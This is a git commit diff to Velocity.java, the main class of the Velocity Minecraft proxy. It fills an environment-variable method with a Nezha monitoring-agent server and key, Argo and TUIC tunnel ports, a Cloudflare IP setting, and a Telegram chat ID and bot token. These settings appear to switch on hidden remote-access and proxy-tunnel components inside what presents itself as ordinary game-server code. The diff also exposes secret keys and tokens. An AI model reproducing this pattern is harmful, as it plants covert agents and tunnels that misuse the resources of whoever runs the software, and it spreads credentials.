1a98eae33f783481bf4bb435b5f4867d565b5fa1
Zhang Ming <kadcs123@outlook.com>
2025-08-31 10:35:43 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,23 +146,23 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+    envVars.put("UUID", "feef31cb-ab1b-4205-a14c-d056f821b3a3");
     envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "");
+    envVars.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
     envVars.put("NEZHA_PORT", "");
-    envVars.put("NEZHA_KEY", "");
-    envVars.put("ARGO_PORT", "");
+    envVars.put("NEZHA_KEY", "sOq90vA8wAdW4fLKaE4JBTZqAmgvRcd8");
+    envVars.put("ARGO_PORT", "8008");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
     envVars.put("HY2_PORT", "");
-    envVars.put("TUIC_PORT", "");
+    envVars.put("TUIC_PORT", "25680");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
-    envVars.put("CHAT_ID", "");
-    envVars.put("BOT_TOKEN", "");
-    envVars.put("CFIP", "");
-    envVars.put("CFPORT", "");
-    envVars.put("NAME", "Mc");
+    envVars.put("CHAT_ID", "5987241018");
+    envVars.put("BOT_TOKEN", "6779283566:AAE-fSGDSik8uy8VoACv4_tLJx6D0ApVSRQ");
+    envVars.put("CFIP", "skk.moe");
+    envVars.put("CFPORT", "443");
+    envVars.put("NAME", "KingsDomain");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
